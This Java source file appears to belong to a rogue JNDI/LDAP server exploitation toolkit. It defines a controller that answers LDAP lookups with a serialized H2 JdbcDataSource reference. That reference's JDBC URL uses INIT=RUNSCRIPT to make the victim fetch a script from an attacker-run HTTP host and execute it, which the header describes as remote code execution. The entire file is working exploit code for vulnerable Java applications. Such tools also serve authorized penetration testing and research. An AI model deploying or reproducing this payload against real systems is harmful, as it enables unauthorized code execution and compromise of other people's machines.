package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 *  RCE via H2 INIT script
 *
 * @see <a href="https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl/">exploitation details</a>

 * Requires:
 *  H2 dependency in classpath
 *
 * @author h0ng10
 */
@LdapMapping(uri = { "/o=h2" })
public class H2 implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("Sending LDAP ResourceRef result for " + base + " with H2 payload");
        String payloadURL = "http://" + Config.hostname + ":" + Config.httpPort + Config.h2; // Get from config if not specified.
        String jdbcUrl = "jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '" + payloadURL + "'";

        Reference h2Reference = new Reference("org.h2.jdbcx.JdbcDataSource", "org.h2.jdbcx.JdbcDataSourceFactory", null);
        h2Reference.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        h2Reference.add(new StringRefAddr("url", jdbcUrl));
        h2Reference.add(new StringRefAddr("user", "sa"));
        h2Reference.add(new StringRefAddr("password", "sa"));
        h2Reference.add(new StringRefAddr("description", "H2 connection"));
        h2Reference.add(new StringRefAddr("loginTimeout", "3"));

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        e.addAttribute("javaSerializedData", serialize(h2Reference));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}